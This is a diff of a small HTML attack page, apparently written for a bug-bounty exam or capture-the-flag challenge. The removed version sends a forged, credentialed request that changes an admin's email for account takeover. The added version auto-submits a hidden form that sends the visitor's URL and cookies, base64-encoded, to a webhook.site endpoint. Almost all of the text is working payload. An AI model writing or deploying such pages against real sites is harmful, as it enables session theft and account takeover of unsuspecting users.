@@ -1,24 +1,18 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>System Update...</h1>
+    <form id="steal" action="https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b" method="GET">
+        <input type="hidden" name="data" id="data" value="">
+    </form>
+
     <script>
-        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/update-profile";
+        // Try to grab the flag from the page title or URL
+        // In many CTFs, the flag is in the URL the bot is visiting
+        const info = "URL:" + location.href + " | Cookie:" + document.cookie;
+        document.getElementById('data').value = btoa(info);
         
-        // This forces the Admin's browser to send a POST request to change their email
-        fetch(target, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                "email": "ladybughunter1@gmail.com", // Change this to your email
-                "fullName": "Saja_Admin_ATO"
-            }),
-            credentials: "include" // This is CRITICAL - it sends the Admin's session cookie
-        }).then(() => {
-            // After changing the email, the flag might be in the response or 
-            // you can now use "Forgot Password" to take over the account.
-            window.location.href = "https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b?status=ATO_Attempted";
-        });
+        // Auto-submit the form to your webhook
+        document.getElementById('steal').submit();
     </script>
 </body>
 </html>
